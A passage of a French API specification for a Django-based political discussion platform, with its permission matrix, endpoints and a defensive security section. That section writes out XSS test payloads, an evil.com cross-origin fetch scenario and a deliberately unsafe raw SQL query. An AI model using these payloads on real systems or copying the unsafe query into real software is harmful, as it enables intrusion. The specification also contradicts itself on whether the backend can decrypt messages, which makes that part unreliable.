- Vérification de l'expiration
- Vérification que l'utilisateur n'est pas banni (cache Redis)

### 4.3 Rôles et permissions

**Deux rôles uniquement :**

| Rôle | Champ DB | Description |
|------|----------|-------------|
| **Utilisateur** | `is_admin = FALSE` | Utilisateur standard (par défaut) |
| **Administrateur** | `is_admin = TRUE` | Accès aux endpoints d'administration |

**Pas de rôle "élu" :** Les élus sont des utilisateurs normaux sans privilèges spéciaux.

### 4.4 Matrice de permissions

| Action | Utilisateur | Admin |
|--------|-------------|-------|
| **Authentification** |
| Se connecter | ✅ | ✅ |
| Se déconnecter | ✅ | ✅ |
| **Profil** |
| Voir son profil | ✅ | ✅ |
| Modifier son profil | ✅ | ✅ |
| Voir profil public d'autrui | ✅ | ✅ |
| Voir profil privé d'autrui | ❌ (sauf si follower) | ✅ |
| **Posts** |
| Créer un post | ✅ | ✅ |
| Modifier son post | ✅ | ✅ |
| Supprimer son post | ✅ | ✅ |
| Supprimer post d'autrui | ❌ | ✅ |
| **Commentaires** |
| Commenter | ✅ | ✅ |
| Supprimer son commentaire | ✅ | ✅ |
| Supprimer commentaire d'autrui | ❌ | ✅ |
| **Likes** |
| Liker/unliker | ✅ | ✅ |
| **Forums/Subforums** |
| Créer forum | ✅ | ✅ |
| Créer subforum | ✅ | ✅ |
| S'abonner | ✅ | ✅ |
| **Domaines** |
| Voir domaines | ✅ | ✅ |
| Créer domaine | ❌ | ✅ |
| Modifier domaine | ❌ | ✅ |
| Supprimer domaine | ❌ | ✅ |
| **Tags** |
| Créer tag | ✅ | ✅ |
| Supprimer tag | ❌ | ✅ |
| Assigner tag à son post | ✅ | ✅ |
| **Messages** |
| Envoyer message | ✅ | ✅ |
| Lire ses messages | ✅ | ✅ |
| Supprimer conversation | ✅ | ✅ |
| **Blocage** |
| Bloquer utilisateur | ✅ | ✅ |
| Débloquer utilisateur | ✅ | ✅ |
| **Signalement** |
| Signaler contenu | ✅ | ✅ |
| Voir tous les signalements | ❌ | ✅ |
| Résoudre signalement | ❌ | ✅ |
| **Modération** |
| Bannir utilisateur | ❌ | ✅ |
| Débannir utilisateur | ❌ | ✅ |
| Voir statistiques | ❌ | ✅ |

---

## 5. API REST - Spécifications des Endpoints

**Conventions générales :**
- Base URL : `/api/v1`
- Format : JSON
- Authentification : `Authorization: Bearer {access_token}` (sauf endpoints publics)
- Pagination : `?page=1&page_size=20` (défaut : 20, max : 100)
- Tri : `?sort_by=created_at&order=desc`

**Codes HTTP :**
- `200 OK` : Succès (GET, PATCH)
- `201 Created` : Ressource créée (POST)
- `204 No Content` : Succès sans contenu (DELETE)
- `400 Bad Request` : Données invalides
- `401 Unauthorized` : Non authentifié
- `403 Forbidden` : Non autorisé (permissions)
- `404 Not Found` : Ressource non trouvée
- `429 Too Many Requests` : Rate limit dépassé
- `500 Internal Server Error` : Erreur serveur

**Format d'erreur standard :**
```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Les données fournies sont invalides",
    "details": {
      "username": ["Ce nom d'utilisateur est déjà pris"]
    }
  }
}
```


### 5.1 Authentification

Voir section 4.1.2 pour les détails complets.

- `GET /auth/google/login` - Initier OAuth2
- `POST /auth/google/callback` - Callback OAuth2
- `POST /auth/refresh` - Renouveler access token
- `POST /auth/logout` - Déconnexion

### 5.2 Utilisateurs

**Note :** Les endpoints existants de l'OpenAPI sont conservés. Voici les nouveaux endpoints ajoutés :

#### **GET /users/me**
Récupère le profil de l'utilisateur connecté.

**Rate limit :** 100/heure/user

**Réponse (200 OK) :**
```json
{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "username": "john_doe",
  "email": "john@example.com",
  "is_admin": false,
  "created_at": "2024-01-15T10:30:00Z",
  "profile": {
    "display_name": "John Doe",
    "bio": "Citoyen engagé",
    "location": "Paris",
    "privacy": "public",
    "profile_picture_url": "https://..."
  },
  "settings": {
    "email_notifications": true,
    "language": "fr"
  }
}
```

#### **PATCH /users/me**
Met à jour le profil de l'utilisateur connecté.

**Rate limit :** 10/heure/user

**Requête :**
```json
{
  "username": "new_username",
  "profile": {
    "display_name": "New Name",
    "bio": "Updated bio",
    "location": "Lyon"
  }
}
```

**Validation :**
- `username` : 3-50 caractères, alphanumériques + `_-`
- `bio` : max 500 caractères
- `display_name` : max 100 caractères

#### **PATCH /users/me/settings**
Met à jour les paramètres utilisateur.

**Requête :**
```json
{
  "email_notifications": false,
  "privacy": "private",
  "language": "en"
}
```

**Validation :**
- `privacy` : 'private' | 'public'
- `language` : 'fr' | 'en'

#### **GET /users/{id}**
Affiche le profil public d'un utilisateur.

**Comportement :**
- Si profil `private` : visible uniquement par les followers acceptés
- Si utilisateur bloqué : retourne 404
- Retourne uniquement les champs publics (pas l'email)

#### **POST /users/{id}/block** ⭐ NOUVEAU
Bloque un utilisateur.

**Rate limit :** 20/heure/user

**Réponse (201 Created) :**
```json
{
  "message": "Utilisateur bloqué avec succès",
  "blocked_user_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Comportement :**
1. Créer entrée dans table `Blocks`
2. Supprimer les follows mutuels (si existants)
3. Empêcher toute interaction future

#### **DELETE /users/{id}/unblock** ⭐ NOUVEAU
Débloque un utilisateur.

**Réponse (204 No Content)**

#### **GET /users/me/blocked** ⭐ NOUVEAU
Liste des utilisateurs bloqués.

**Réponse (200 OK) :**
```json
{
  "blocked_users": [
    {
      "user_id": "...",
      "username": "blocked_user",
      "blocked_at": "2024-01-15T10:30:00Z"
    }
  ],
  "pagination": {
    "page": 1,
    "page_size": 20,
    "total": 5
  }
}
```

#### **GET /users/search**
Recherche d'utilisateurs par username.

**Rate limit :** 100/heure/IP (protection énumération)

**Requête :**
```
GET /users/search?username=john&page=1&page_size=20
```

**Comportement :**
- Recherche insensible à la casse
- Exclut les utilisateurs bloqués
- Exclut les profils privés non-followers

#### **GET /users/bulk**
Récupère plusieurs profils en une requête.

**Rate limit :** 100/heure/IP

**Requête :**
```
GET /users/bulk?ids=uuid1,uuid2,uuid3
```

**Validation :**
- Max 50 IDs par requête

### 5.3 Domaines

#### **GET /domains/**
Liste les 9 domaines politiques.

**Rate limit :** 1000/heure/IP

**Réponse (200 OK) :**
```json
{
  "domains": [
    {
      "domain_id": "...",
      "domain_name": "Culture",
      "description": "Discussions sur la culture locale",
      "icon_url": "https://...",
      "subforum_count": 12,
      "created_at": "2024-01-01T00:00:00Z"
    },
    ...
  ]
}
```

#### **GET /domains/{id}**
Détails d'un domaine.

#### **GET /domains/{id}/subforums**
Liste des sous-forums d'un domaine.

#### **POST /domains/{id}/subforums/create**
Créer un sous-forum dans un domaine.

**Requête :**
```json
{
  "name": "Cinéma et théâtre",
  "description": "Discussions sur le cinéma et le théâtre local"
}
```

**Validation :**
- `name` : 3-200 caractères
- `description` : max 1000 caractères

### 5.4 Forums

Les endpoints existants de l'OpenAPI sont conservés :
- `GET /forums/` - Liste des forums
- `GET /forums/{id}` - Détails d'un forum
- `POST /forums/create` - Créer un forum
- `GET /forums/me` - Forums suivis
- `GET /forums/search` - Recherche de forums
- `GET /forums/{id}/subforums` - Sous-forums d'un forum
- `POST /forums/{id}/subforums/create` - Créer un sous-forum

### 5.5 Subscriptions

Les endpoints existants sont conservés :
- `POST /subscriptions/forums/{id}` - S'abonner à un forum
- `DELETE /subscriptions/forums/{id}/unsubscribe` - Se désabonner
- `POST /subscriptions/subforums/{id}` - S'abonner à un sous-forum
- `DELETE /subscriptions/subforums/{id}/unsubscribe` - Se désabonner

### 5.6 Posts

Les endpoints existants sont conservés et complétés :

#### **POST /posts/create**
Créer un post.

**Rate limit :** 10/heure/user

**Requête :**
```json
{
  "title": "Titre du post",
  "content": "Contenu du post...",
  "subforum_id": "uuid-subforum",
  "media_urls": []  // TODO - NE PAS IMPLÉMENTER
}
```

**Validation :**
- `title` : 1-200 caractères, regex `^[a-zA-Z0-9 .,!?'À-ÿ-]+$`
- `content` : 1-10000 caractères
- Sanitisation HTML avec Bleach

**Comportement :**
1. Valider les données
2. Sanitiser le contenu HTML
3. Générer signature HMAC-SHA256 du contenu
4. Créer le post
5. Logger dans AuditLogs

#### **GET /posts/{id}**
Détails d'un post.

**Comportement :**
- Vérifier visibilité (privacy de l'auteur)
- Vérifier blocage
- Incrémenter compteur de vues (optionnel)

#### **DELETE /posts/{id}/delete**
Supprimer son propre post.

**Validation :**
- Vérifier que `post.user_id == authenticated_user.id`
- Sinon : 403 Forbidden

#### **POST /posts/{id}/like** ⭐ NOUVEAU
Liker un post.

**Rate limit :** 100/heure/user

**Réponse (201 Created) :**
```json
{
  "message": "Post liké",
  "like_count": 42
}
```

**Comportement :**
1. Vérifier que le like n'existe pas déjà (UNIQUE constraint)
2. Créer entrée dans `Likes`
3. Incrémenter `post.like_count`

#### **DELETE /posts/{id}/unlike** ⭐ NOUVEAU
Retirer son like.

**Réponse (204 No Content)**

**Comportement :**
1. Supprimer entrée dans `Likes`
2. Décrémenter `post.like_count`

#### **GET /posts/{id}/likes** ⭐ NOUVEAU
Liste des utilisateurs ayant liké.

**Réponse (200 OK) :**
```json
{
  "likes": [
    {
      "user_id": "...",
      "username": "john_doe",
      "liked_at": "2024-01-15T10:30:00Z"
    }
  ],
  "pagination": {...},
  "total_likes": 42
}
```

#### **GET /posts/feed**
Fil d'actualité personnalisé.

**Comportement :**
- Posts des utilisateurs suivis
- Posts des forums abonnés
- Tri par `created_at DESC`
- Pagination

#### **GET /posts/discover**
Découverte de posts populaires.

**Comportement :**
- Posts publics récents
- Tri par popularité (likes + comments)
- Exclut les posts des utilisateurs bloqués


### 5.7 Commentaires ⭐ NOUVEAU

#### **GET /posts/{id}/comments**
Liste des commentaires d'un post.

**Rate limit :** 200/heure/user

**Requête :**
```
GET /posts/{id}/comments?page=1&page_size=20&sort_by=created_at&order=desc
```

**Réponse (200 OK) :**
```json
{
  "comments": [
    {
      "comment_id": "...",
      "user": {
        "user_id": "...",
        "username": "john_doe",
        "display_name": "John Doe"
      },
      "content": "Super post !",
      "parent_comment_id": null,
      "reply_count": 3,
      "created_at": "2024-01-15T10:30:00Z",
      "updated_at": "2024-01-15T10:30:00Z"
    }
  ],
  "pagination": {...},
  "total_comments": 42
}
```

#### **POST /posts/{id}/comments/create**
Créer un commentaire sur un post.

**Rate limit :** 30/heure/user

**Requête :**
```json
{
  "content": "Excellent point de vue !"
}
```

**Validation :**
- `content` : 1-2000 caractères
- Sanitisation HTML

**Comportement :**
1. Vérifier que le post existe et est visible
2. Vérifier que l'auteur du post n'a pas bloqué l'utilisateur
3. Sanitiser le contenu
4. Créer le commentaire
5. Incrémenter `post.comment_count`

#### **DELETE /comments/{id}/delete**
Supprimer son propre commentaire.

**Validation :**
- Vérifier que `comment.user_id == authenticated_user.id`

**Comportement :**
1. Supprimer le commentaire
2. Supprimer les réponses (CASCADE)
3. Décrémenter `post.comment_count`

#### **GET /comments/{id}/replies**
Réponses à un commentaire (commentaires imbriqués).

**Réponse (200 OK) :**
```json
{
  "replies": [
    {
      "comment_id": "...",
      "user": {...},
      "content": "Je suis d'accord",
      "parent_comment_id": "parent-uuid",
      "created_at": "..."
    }
  ],
  "pagination": {...}
}
```

#### **POST /comments/{id}/reply**
Répondre à un commentaire.

**Requête :**
```json
{
  "content": "Merci pour cette précision"
}
```

**Comportement :**
- Créer un commentaire avec `parent_comment_id` défini

### 5.8 Tags

Les endpoints existants sont conservés avec modifications :

#### **GET /tags/**
Liste tous les tags disponibles.

#### **POST /tags/create**
Crée un nouveau tag.

**Permissions :** TOUS les utilisateurs ✅

**Rate limit :** 10/heure/user

**Requête :**
```json
{
  "tag_name": "politique-locale"
}
```

**Validation :**
- `tag_name` : 2-50 caractères, regex `^[a-zA-Z0-9_-]+$`
- Vérifier unicité

#### **POST /tags/assign/{post_id}**
Assigner des tags à un post.

**Requête :**
```json
{
  "tags": ["uuid-tag1", "uuid-tag2"]
}
```

**Validation :**
- Max 5 tags par post
- Vérifier que l'utilisateur est l'auteur du post

#### **POST /tags/unassign/{post_id}**
Désassigner des tags d'un post.

### 5.9 Followers

Les endpoints existants sont conservés :
- `GET /followers/me` - Liste des followers
- `GET /following/me` - Liste des suivis
- `POST /followers/{id}/request` - Envoyer demande de suivi
- `GET /followers/requests` - Demandes en attente
- `POST /followers/{id}/accept` - Accepter demande
- `POST /followers/{id}/refuse` - Refuser demande
- `DELETE /following/{id}/unfollow` - Se désabonner

**Comportement selon privacy :**
- `public` : Follow automatique (pas de demande)
- `private` : Demande à accepter manuellement

### 5.10 Messages

Les endpoints existants sont conservés :

#### **GET /messages/**
Liste les conversations de l'utilisateur.

**Réponse (200 OK) :**
```json
{
  "conversations": [
    {
      "conversation_id": "...",
      "other_user": {
        "user_id": "...",
        "username": "jane_doe",
        "display_name": "Jane Doe"
      },
      "last_message": {
        "content": "[Chiffré]",
        "created_at": "2024-01-15T10:30:00Z",
        "is_read": false
      },
      "unread_count": 3
    }
  ]
}
```

#### **GET /messages/{user_id}**
Messages échangés avec un utilisateur spécifique.

**Comportement :**
1. Vérifier que l'utilisateur n'est pas bloqué
2. Déchiffrer les messages (E2E)
3. Marquer comme lus

**Réponse (200 OK) :**
```json
{
  "messages": [
    {
      "message_id": "...",
      "sender_id": "...",
      "receiver_id": "...",
      "content": "Contenu déchiffré",
      "is_read": true,
      "created_at": "2024-01-15T10:30:00Z"
    }
  ],
  "pagination": {...}
}
```

#### **POST /messages/{user_id}/create**
Envoyer un message.

**Rate limit :** 50/heure/user

**Requête :**
```json
{
  "content": "Bonjour, comment allez-vous ?"
}
```

**Validation :**
- `content` : 1-5000 caractères
- Vérifier que le destinataire accepte les messages (privacy)
- Vérifier absence de blocage

**Comportement :**
1. Chiffrer le message (E2E - voir section 6.7)
2. Stocker le message chiffré
3. Notifier le destinataire (optionnel)

#### **DELETE /messages/{user_id}/delete**
Supprimer une conversation.

**Comportement :**
- Suppression soft (marquer comme supprimé pour l'utilisateur)
- L'autre utilisateur conserve sa copie

### 5.11 Médias (TODO - NE PAS IMPLÉMENTER) ⚠️

**IMPORTANT :** Cette section est spécifiée pour référence future mais **NE DOIT PAS être implémentée** dans cette version.

#### **POST /media/upload**
Upload un média (image ou vidéo).

**Approche technique (pour référence future) :**
1. Frontend envoie le fichier
2. Backend valide (type, taille)
3. Upload vers S3/MinIO
4. Retourne URL signée
5. Frontend inclut l'URL dans `POST /posts/create`

**Validation :**
- Types acceptés : JPEG, PNG, GIF, WebP, MP4, WebM
- Taille max : 10 MB (images), 100 MB (vidéos)
- Max 4 médias par post

**Stockage :**
- MinIO (compatible S3, open-source)
- Bucket : `social-media`
- Nommage : `{user_id}/{uuid}.{ext}`
- URL signée avec expiration 1h

### 5.12 Signalement (Utilisateurs) ⭐ NOUVEAU

#### **POST /reports/create**
Signaler un contenu ou un utilisateur.

**Rate limit :** 20/heure/user

**Requête :**
```json
{
  "target_type": "post",
  "target_id": "uuid-post",
  "reason": "spam",
  "description": "Ce post contient du spam publicitaire"
}
```

**Validation :**
- `target_type` : 'post' | 'comment' | 'user'
- `reason` : 'spam' | 'harassment' | 'inappropriate' | 'misinformation' | 'other'
- `description` : max 500 caractères (optionnel)

**Réponse (201 Created) :**
```json
{
  "report_id": "...",
  "message": "Signalement enregistré, il sera traité par un modérateur",
  "status": "pending"
}
```

**Comportement :**
1. Créer entrée dans `Reports`
2. Logger dans AuditLogs
3. (Optionnel) Notifier les admins si seuil atteint

### 5.13 Administration (ADMIN uniquement) ⭐ NOUVEAU

**Tous ces endpoints nécessitent `is_admin = TRUE`**

#### **Gestion des domaines**

**POST /admin/domains/create**
Créer un nouveau domaine.

**PATCH /admin/domains/{id}**
Modifier un domaine.

**DELETE /admin/domains/{id}**
Supprimer un domaine.

#### **Gestion des tags**

**DELETE /admin/tags/delete**
Supprimer un tag.

**Requête :**
```
DELETE /admin/tags/delete?tag_id=uuid
```

#### **Modération**

**GET /admin/reports**
Voir tous les signalements.

**Requête :**
```
GET /admin/reports?status=pending&page=1&page_size=20
```

**Réponse (200 OK) :**
```json
{
  "reports": [
    {
      "report_id": "...",
      "reporter": {
        "user_id": "...",
        "username": "reporter_user"
      },
      "target_type": "post",
      "target_id": "...",
      "target_preview": {
        "title": "Titre du post signalé",
        "content": "Extrait..."
      },
      "reason": "spam",
      "description": "...",
      "status": "pending",
      "created_at": "..."
    }
  ],
  "pagination": {...}
}
```

**POST /admin/reports/{id}/resolve**
Marquer un signalement comme résolu.

**Requête :**
```json
{
  "action_taken": "content_removed",
  "notes": "Post supprimé pour spam"
}
```

**POST /admin/reports/{id}/reject**
Rejeter un signalement.

**POST /admin/users/{id}/ban**
Bannir un utilisateur.

**Comportement :**
1. Mettre `is_banned = TRUE`
2. Invalider tous les refresh tokens (Redis)
3. Logger dans AuditLogs

**POST /admin/users/{id}/unban**
Débannir un utilisateur.

**DELETE /admin/posts/{id}/remove**
Supprimer un post (modération).

**DELETE /admin/comments/{id}/remove**
Supprimer un commentaire (modération).

#### **Statistiques**

**GET /admin/stats/users**
Statistiques utilisateurs.

**Réponse (200 OK) :**
```json
{
  "total_users": 1523,
  "new_users_today": 12,
  "new_users_this_week": 87,
  "active_users_today": 342,
  "banned_users": 5
}
```

**GET /admin/stats/posts**
Statistiques posts.

**GET /admin/stats/activity**
Activité globale.


### 5.14 Format de réponse standard

**Succès avec données :**
```json
{
  "data": {...},
  "meta": {
    "timestamp": "2024-01-15T10:30:00Z",
    "request_id": "uuid"
  }
}
```

**Succès avec pagination :**
```json
{
  "data": [...],
  "pagination": {
    "page": 1,
    "page_size": 20,
    "total_pages": 5,
    "total_items": 100,
    "has_next": true,
    "has_previous": false
  },
  "meta": {...}
}
```

**Erreur :**
```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Les données fournies sont invalides",
    "details": {
      "field_name": ["Message d'erreur spécifique"]
    },
    "request_id": "uuid",
    "timestamp": "2024-01-15T10:30:00Z"
  }
}
```

---

## 6. Sécurité

### 6.1 Protection contre IDOR (Insecure Direct Object Reference)

**Problème identifié dans `Securite_protocole.md` :**
- Endpoints vulnérables : `/users/{id}`, `/posts/{id}/delete`, `/messages/{id}`

**Solutions implémentées :**

#### **1. Utilisation d'UUID au lieu d'ID séquentiels**
```python
# ❌ AVANT (MongoDB ObjectId ou auto-increment)
user_id = 1, 2, 3, 4...  # Prévisible

# ✅ APRÈS (UUID v4)
user_id = "550e8400-e29b-41d4-a716-446655440000"  # Non-prévisible
```

#### **2. Vérification systématique des permissions**
```python
# Exemple : DELETE /posts/{id}/delete
def delete_post(request, post_id):
    post = Post.objects.get(post_id=post_id)

    # Vérification ownership
    if post.user_id != request.user.user_id and not request.user.is_admin:
        raise PermissionDenied("Vous ne pouvez supprimer que vos propres posts")

    post.delete()
```

#### **3. Filtrage par utilisateur authentifié**
```python
# Exemple : GET /messages/{user_id}
def get_messages(request, user_id):
    # Vérifier que l'utilisateur authentifié est impliqué dans la conversation
    messages = Message.objects.filter(
        Q(sender_id=request.user.user_id, receiver_id=user_id) |
        Q(sender_id=user_id, receiver_id=request.user.user_id)
    )
```

### 6.2 Protection de la vie privée

**Niveaux de privacy :**

| Privacy | Profil visible | Posts visibles | Messages | Follow |
|---------|----------------|----------------|----------|--------|
| `public` | ✅ Tous | ✅ Tous authentifiés | ✅ Tous | Automatique |
| `private` | ✅ Tous (dans recherches) | ❌ Followers uniquement | ❌ Followers uniquement | Demande manuelle |

**Implémentation :**
```python
def can_view_post(viewer, post):
    # Post de l'utilisateur lui-même
    if viewer.user_id == post.user_id:
        return True

    # Profil public
    if post.user.profile.privacy == 'public':
        return True

    # Profil privé : vérifier follow accepté
    if post.user.profile.privacy == 'private':
        return Follow.objects.filter(
            follower_id=viewer.user_id,
            following_id=post.user_id,
            status='accepted'
        ).exists()

    return False
```

### 6.3 Rate Limiting

**Objectif :** Limiter le nombre de requêtes par utilisateur/IP pour éviter les abus et attaques DDoS.

**Schéma de fonctionnement :**

```
┌──────────────────────────────────────────────────────────────┐
│              RATE LIMITING - Fixed Window                    │
│              Limite: 10 posts / heure                        │
└──────────────────────────────────────────────────────────────┘

Utilisateur fait 12 requêtes POST /posts/create en 1 heure:

Requête 1-10  ✅  Acceptées
Requête 11-12 ❌  Rejetées (HTTP 429)

┌─────────────────────────────────────────────────────────────┐
│  Client                                                     │
└────────┬────────────────────────────────────────────────────┘
         │ POST /posts/create (Requête #11)
         ▼
┌─────────────────────────────────────────────────────────────┐
│  Middleware Rate Limit                                      │
│                                                             │
│  1. Identifier la clé                                       │
│     key = f"ratelimit:user:{user_id}:posts_create"        │
│                                                             │
│  2. Vérifier Redis                                          │
│     count = redis.get(key)  # → 10                         │
│                                                             │
│  3. Comparer avec la limite                                 │
│     if count >= 10:  # Limite dépassée                     │
│         return HTTP 429 "Too Many Requests"                │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────┐
│   Client    │  Reçoit HTTP 429
│             │  {
│             │    "error": "RATE_LIMIT_EXCEEDED",
│             │    "retry_after": 1800
│             │  }
└─────────────┘
```

**Implémentation avec Redis :**

```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='user', rate='10/h', method='POST')
def create_post(request):
    # Logique de création
    pass
```

**Limites par endpoint :**

| Endpoint | Limite | Clé | Raison |
|----------|--------|-----|--------|
| POST /posts/create | 10/heure | user_id | Éviter spam de posts |
| POST /comments/create | 30/heure | user_id | Éviter spam de commentaires |
| POST /messages/create | 50/heure | user_id | Éviter spam de messages |
| GET /users/search | 100/heure | IP | Éviter énumération utilisateurs |
| POST /auth/google/login | 20/heure | IP | Éviter brute force |
| POST /reports/create | 20/heure | user_id | Éviter abus de signalements |
| POST /users/{id}/block | 20/heure | user_id | Éviter abus de blocages |

**Réponse en cas de dépassement :**
```json
{
  "error": {
    "code": "RATE_LIMIT_EXCEEDED",
    "message": "Trop de requêtes. Veuillez réessayer dans 30 minutes",
    "retry_after": 1800
  }
}
```

### 6.4 Validation et sanitisation des entrées

**Objectif :** Vérifier que les données sont valides (validation) et nettoyer le contenu dangereux (sanitisation).

**Schéma de flux :**

```
┌──────────────────────────────────────────────────────────────┐
│           VALIDATION + SANITISATION                          │
└──────────────────────────────────────────────────────────────┘

Client envoie:
POST /posts/create
{
  "title": "Mon post",
  "content": "<p>Bonjour</p><script>alert('XSS')</script>"
}
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  1. VALIDATION (DRF Serializer)                             │
│                                                             │
│  ✅ title: longueur 1-200 caractères                        │
│  ✅ content: longueur 1-10000 caractères                    │
│  ✅ subforum_id: UUID valide                                │
│                                                             │
│  Si invalide → HTTP 400 "Validation error"                 │
└─────────────────────────────────────────────────────────────┘
         │ Validation OK
         ▼
┌─────────────────────────────────────────────────────────────┐
│  2. SANITISATION (Bleach)                                   │
│                                                             │
│  Tags autorisés: ['p', 'br', 'strong', 'em', 'a']          │
│  Tags interdits: ['script', 'iframe', 'object']            │
│                                                             │
│  AVANT: "<p>Bonjour</p><script>alert('XSS')</script>"      │
│  APRÈS: "<p>Bonjour</p>"  ← <script> supprimé              │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│  3. STOCKAGE EN DB                                          │
│                                                             │
│  Post.objects.create(                                       │
│    title="Mon post",                                        │
│    content="<p>Bonjour</p>"  ← Contenu nettoyé             │
│  )                                                          │
└─────────────────────────────────────────────────────────────┘
```

#### **Validation des données**

**Utilisation de Django REST Framework Serializers :**
```python
from rest_framework import serializers

class PostCreateSerializer(serializers.Serializer):
    title = serializers.CharField(
        min_length=1,
        max_length=200,
        validators=[RegexValidator(r'^[a-zA-Z0-9 .,!?\'À-ÿ-]+$')]
    )
    content = serializers.CharField(min_length=1, max_length=10000)
    subforum_id = serializers.UUIDField()

    def validate_content(self, value):
        # Sanitisation HTML
        import bleach
        allowed_tags = ['p', 'br', 'strong', 'em', 'a']
        allowed_attrs = {'a': ['href', 'title']}
        return bleach.clean(value, tags=allowed_tags, attributes=allowed_attrs)
```

#### **Sanitisation avec Bleach (Protection XSS)**

**Approche whitelist (liste blanche) :**
```python
import bleach

def sanitize_html(content):
    allowed_tags = ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li']
    allowed_attrs = {
        'a': ['href', 'title'],
    }
    allowed_protocols = ['http', 'https']

    return bleach.clean(
        content,
        tags=allowed_tags,
        attributes=allowed_attrs,
        protocols=allowed_protocols,
        strip=True  # Supprime les tags non autorisés
    )
```

**Exemples de sanitisation :**

| Entrée | Sortie (après Bleach) |
|--------|----------------------|
| `<p>Bonjour</p>` | `<p>Bonjour</p>` ✅ |
| `<script>alert('XSS')</script>` | `` (vide) ❌ |
| `<a href="http://example.com">Lien</a>` | `<a href="http://example.com">Lien</a>` ✅ |
| `<a href="javascript:alert()">Lien</a>` | `<a>Lien</a>` ❌ (href retiré) |
| `<iframe src="evil.com"></iframe>` | `` (vide) ❌ |

#### **Protection SQL Injection**

**Django ORM (protection native) :**
```python
# ✅ SÉCURISÉ (paramétrisé)
User.objects.filter(username=user_input)

# ❌ DANGEREUX (à éviter)
User.objects.raw(f"SELECT * FROM users WHERE username = '{user_input}'")
```

### 6.5 Chiffrement et Signatures

**Note :** Pas de hachage de mots de passe nécessaire (authentification 100% Google OAuth2).

#### **Signature des posts (HMAC-SHA256)**

**Génération de signature :**
```python
import hmac
import hashlib

def generate_content_signature(content, secret_key):
    return hmac.new(
        secret_key.encode(),
        content.encode(),
        hashlib.sha256
    ).hexdigest()

# Lors de la création du post
post.content_signature = generate_content_signature(
    post.content,
    settings.CONTENT_SIGNATURE_KEY
)
```

**Vérification d'intégrité :**
```python
def verify_post_integrity(post):
    expected_signature = generate_content_signature(
        post.content,
        settings.CONTENT_SIGNATURE_KEY
    )
    return hmac.compare_digest(post.content_signature, expected_signature)
```

### 6.6 Chiffrement de bout en bout (E2E) pour les messages

**Approche :**
1. Frontend génère une paire de clés RSA pour chaque utilisateur
2. Clé publique stockée en DB, clé privée reste côté client
3. Messages chiffrés avec AES-256, clé AES chiffrée avec RSA

**Schéma :**
```
Sender                          Backend                         Receiver
------                          -------                         --------
1. Générer clé AES aléatoire
2. Chiffrer message avec AES
3. Chiffrer clé AES avec RSA public receiver
4. Chiffrer clé AES avec RSA public sender (pour historique)
                    ------>     5. Stocker encrypted_content
                                   + encryption_key_sender
                                   + encryption_key_receiver
                                                    ------>     6. Récupérer message
                                                                7. Déchiffrer clé AES avec RSA privé
                                                                8. Déchiffrer message avec AES
```

**Implémentation backend (stockage uniquement) :**
```python
class Message(models.Model):
    encrypted_content = models.TextField()  # Message chiffré AES
    encryption_key_sender = models.TextField()  # Clé AES chiffrée RSA (sender)
    encryption_key_receiver = models.TextField()  # Clé AES chiffrée RSA (receiver)
```

**Note :** Le backend ne peut PAS déchiffrer les messages (zero-knowledge).

### 6.7 Protection contre l'énumération d'utilisateurs

**Note :** Pas de protection nécessaire sur l'authentification (gérée par Google OAuth2).

**Protection sur les endpoints de recherche et profil :**

**Rate limiting sur recherche :**
```python
@ratelimit(key='ip', rate='100/h')
def search_users(request):
    # Limite les tentatives d'énumération via recherche
    pass
```

**Réponses génériques :**
```python
# Endpoint de recherche
# Ne pas révéler si un utilisateur existe ou non via des messages différents
if not results:
    return {"results": [], "message": "Aucun résultat trouvé"}
```

### 6.8 Audit Logging

**Actions loggées :**
- Connexions/déconnexions
- Création/modification/suppression de contenu
- Actions admin (ban, suppression de contenu)
- Signalements
- Tentatives d'accès non autorisé

**Implémentation :**
```python
def log_action(user, action_type, resource_type, resource_id, details=None, ip_address=None):
    AuditLog.objects.create(
        user_id=user.user_id if user else None,
        action_type=action_type,
        resource_type=resource_type,
        resource_id=resource_id,
        details=json.dumps(details) if details else None,
        ip_address=ip_address,
        created_at=timezone.now()
    )

# Exemple d'utilisation
log_action(
    user=request.user,
    action_type='create',
    resource_type='post',
    resource_id=post.post_id,
    details={'title': post.title},
    ip_address=get_client_ip(request)
)
```

### 6.9 CORS (Cross-Origin Resource Sharing)

**Objectif :** Autoriser uniquement le frontend officiel à accéder à l'API, bloquer les autres domaines.

**Schéma de fonctionnement :**

```
┌──────────────────────────────────────────────────────────────┐
│                  CORS - Contrôle d'accès                     │
└──────────────────────────────────────────────────────────────┘

Scénario 1: Requête depuis le frontend autorisé
┌─────────────────────┐
│ frontend.geopo.com  │
└──────────┬──────────┘
           │ fetch('https://api.geopo.com/users/me')
           │ Origin: https://frontend.geopo.com
           ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (CORS Middleware)                                  │
│                                                             │
│  CORS_ALLOWED_ORIGINS = ["https://frontend.geopo.com"]     │
│                                                             │
│  Origin reçu: https://frontend.geopo.com                   │
│  ✅ Dans la liste → ACCEPTÉ                                │
│                                                             │
│  Response Headers:                                          │
│    Access-Control-Allow-Origin: https://frontend.geopo.com │
│    Access-Control-Allow-Credentials: true                  │
└─────────────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────┐
│ frontend.geopo.com  │  ✅ Reçoit les données
└─────────────────────┘


Scénario 2: Requête depuis un site malveillant
┌─────────────────────┐
│  evil.com           │
└──────────┬──────────┘
           │ fetch('https://api.geopo.com/users/me')
           │ Origin: https://evil.com
           ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (CORS Middleware)                                  │
│                                                             │
│  CORS_ALLOWED_ORIGINS = ["https://frontend.geopo.com"]     │
│                                                             │
│  Origin reçu: https://evil.com                             │
│  ❌ PAS dans la liste → REJETÉ                             │
│                                                             │
│  Response Headers:                                          │
│    (Pas de Access-Control-Allow-Origin)                    │
└─────────────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────┐
│  evil.com           │  ❌ Navigateur bloque la réponse
│                     │  Error: CORS policy blocked
└─────────────────────┘
```

**Configuration pour le frontend :**
